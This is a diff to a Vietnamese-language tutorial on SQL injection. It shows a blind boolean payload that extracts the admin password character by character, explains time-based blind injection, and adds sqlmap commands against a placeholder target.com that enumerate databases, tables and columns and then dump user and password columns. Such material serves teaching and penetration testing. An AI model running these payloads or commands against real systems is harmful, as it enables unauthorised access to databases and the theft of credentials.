@@ -45,3 +45,9 @@ SQL injection (SQLi) là một kỹ thuật tấn công mạng nguy hiểm, tron
   `?id=1 and (select subtr(password,$num$,1) from users where username='admin') = '$char$'` thì 2 biến num và char bạn sẽ thay bằng các ký tự thích hợp
 2. Time-based
 - Nếu server có chức năng chặn nhiều request mà sai nhiều lần đến thì sao? ta sẽ sử dụng 1 kỹ thuật tìm time trả về của request, ý tưởng ở đây là sẽ chuyển ký tự sang mã ascii để gắn vào hàm sleep từ đó ta dựa vào time để tìm đáp án, tuy nhiên đây sẽ có sai số vì còn dựa vào đường truyền, vị trí.... nên có thể ảnh hưởng rất nhiều đến thời gian trả về nên kỹ thuật này không được áp dụng nhiều (ta có thể sử dụng trung bình cộng của khoảng 100 request để tìm thời gian nhưng chỉ là tương đối)
+
+### Sài TooL SQLMAP
+- Liệt kê database `sqlmap -u "http://target.com/page.php?id=1" --dbs --batch` -> vd name_db product
+- Liệt kê bảng trong database `sqlmap -u "http://target.com/page.php?id=1" -D product --tables --batch` -> bảng users
+- Liệt kê cột trang database `sqlmap -u "http://target.com/page.php?id=1" -D product -T users --columns --batch` cột user, password
+- Dump dữ liệu `sqlmap -u "http://target.com/page.php?id=1" -D product -T user -C user,password --dump --batch`
